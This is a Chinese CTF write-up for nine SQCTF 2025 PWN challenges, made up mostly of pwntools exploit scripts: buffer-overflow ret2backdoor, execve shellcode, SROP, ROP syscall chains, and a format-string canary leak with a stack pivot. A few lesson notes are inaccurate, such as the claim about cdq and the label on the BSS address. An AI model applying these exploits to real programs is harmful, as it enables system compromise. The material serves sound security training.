---
title: 【WP】第四届 SQCTF 网络安全及信息对抗大赛 PWN 方向题目
contest: SQCTF
year: 2025
difficulty: mixed
vuln_type: pwn_unknown
tags: [ret2backdoor, shellcode-injection, SROP-SigreturnFrame, fmt-leak-canary, stack-pivot-leave-ret, syscall-rax-rdi-rsi-rdx, asm-pwntools]
attack_chain: 1. cat ret2backdoor 0x40121B / 2. shellcode push /bin/sh + rax=0x3b syscall / 3. SROP frame rdi=/bin/sh rip=syscall 触发 sigreturn / 4. gift ret2backdoor / 5. pwn02 base64 编码 + ret2backdoor / 6. 自写 pop rdx/rsi/rdi/rax syscall 调用 / 7. fmt %11$p %15$p %17$p 泄 canary+proc+stack 后 leave-ret 跳板 / 8. key 直接传 FTCUNQS 字符串 / 9. shellcode.ljust(0x48) + 0x4040A0
key_payload: 9 个 PWN 题涵盖 ret2backdoor/shellcode/SROP/fmt-leak/stack-pivot/syscall/asm  全套 PWN 基础
one_liner: 第四届 SQCTF PWN 方向 9 题合集，覆盖 ret2backdoor + shellcode + SROP + fmt 泄 canary + stack pivot + syscall 全套入门。
lesson: PWN 入门九大题型：ret2backdoor / shellcode / SROP / fmt-leak / stack-pivot / syscall-rax / key-string / base64-wrap；asm() + shellcraft.sh() 是 pwntools 内置 shellcode 工具。
quality: high
---

# 【WP】第四届 SQCTF 网络安全及信息对抗大赛 PWN 方向题目

## 概览
第四届 SQCTF PWN 方向 9 题合集，涵盖 PWN 入门全套。

## 题 1: cat (ret2backdoor)
```python
from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='amd64', os='linux')
p = remote('challenge.qsnctf.com', 31125)
backdoor = 0x40121B
payload = b'a'*(0x50+0x8) + p64(backdoor)
p.sendlineafter(b'characters\n', payload)
p.interactive()
```

## 题 2: shellcode
```python
shellcode = '''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    mov rax, 0x3b
    cdq
    syscall
'''
payload = asm(shellcode)
p.sendafter(b'window\n', payload)
```

## 题 3: SROP (Sigreturn-Oriented Programming)
```python
frame = SigreturnFrame()
frame.rdi = 0x40203a              # "/bin/sh"
frame.rsi = 0                      # argv = NULL
frame.rdx = 0                      # envp = NULL
frame.rax = 59                     # execve
frame.rip = 0x40101d               # syscall instruction

rop = b'a'*0x8
rop += p64(0x401049)  # pop rsi; pop rax; ret
rop += p64(0)
rop += p64(15)
rop += p64(0x40101d)  # syscall
rop += bytes(frame)
p.send(rop)
```

## 题 4: gift (ret2backdoor)
```python
backdoor = 0x4011DC
payload = b'a'*(0x40+0x8) + p64(backdoor)
p.sendlineafter(b'gift\n', payload)
```

## 题 5: pwn02 (base64)
```python
import base64
backdoor = 0x401422
payload = b'a'*(0x60+0x8) + p64(backdoor) + p64(0)
payload = base64.b64encode(payload)
p.sendlineafter(b'now\n', payload)
```

## 题 6: 自写 syscall
```python
pop_rdx_rsi_rdi_rax_ret = 0x4011E0
syscall_addr = 0x4011EC
p.sendline(b'/bin/sh\x00')
p.recvuntil(b'0x')
binsh_addr = int(p.recv(12), 16)
p.recv()
p.sendline(b'1')
payload = b'/bin/sh\x00' + b'a'*0x20 + p64(pop_rdx_rsi_rdi_rax_ret) + p64(0) + p64(0) + p64(binsh_addr) + p64(0x3b) + p64(syscall_addr)
p.sendline(payload)
```

## 题 7: pwn03 (fmt leak + stack pivot)
```python
p.sendlineafter(b'sun\n', b'%11$p-%15$p-%17$p')
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
p.recvuntil(b'0x')
proc = int(p.recv(12), 16)
proc_base = proc - 0x125b
p.recvuntil(b'0x')
stack = int(p.recv(12), 16)
stack_input = stack - 0x148
main_addr = 0x1260
pop_rdi_ret = 0x1245
pop_rbp_ret = 0x11d3
call_system = 0x1253
leave_ret = 0x1234
ret_addr = 0x125A

# 第一次：恢复 main
payload = b'a'*0x8 + p64(canary) + p64(0xdeadbeef) + p64(proc_base + main_addr)
p.send(payload)

# 第二次：ret + pop rdi + call system + /bin/sh
payload = p64(proc_base + ret_addr) + p64(proc_base + pop_rdi_ret) + p64(stack_input - 0x10) + p64(proc_base + call_system) + b'/bin/sh'
p.sendafter(b'sun\n', payload)

# 第三次：leave-ret 跳板
payload = b'a'*0x8 + p64(canary) + p64(stack_input - 0x30 - 0x8) + p64(proc_base + leave_ret)
p.send(payload)
```

## 题 8: key (key-string)
```python
payload = b'\x46\x54\x43\x55\x4e\x51\x53\x00'  # "FTCUNQS"
p.sendafter(b'key: ', payload)
```

## 题 9: bad (shellcode + BSS)
```python
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x48, b'\x00') + p64(0x4040A0)
p.sendlineafter(b'do ?\n', payload)
```

## 经验提炼
- PWN 入门九大题型：ret2backdoor / shellcode / SROP / fmt-leak / stack-pivot / syscall-rax / key-string / base64-wrap
- `asm()` + `shellcraft.sh()` 是 pwntools 内置 shellcode 工具
- SigreturnFrame 是 SROP 核心，恢复所有寄存器
- fmt `%11$p-%15$p-%17$p` 多段读栈
- leave-ret 跳板：rsp = rbp，再 pop rbp + ret
- `/bin/sh\x00` 字符串在 .bss 段（0x4040A0）
- base64.b64encode 是 base64 包装场景
- pop rsi; pop rax; ret 是 SROP 设置 rax=15（sigreturn syscall）
- pwntools `context(arch='amd64', os='linux')` 必须设置
- `cdq` 指令把 rax 符号扩展到 rdx（常用于把 rdx 清零）
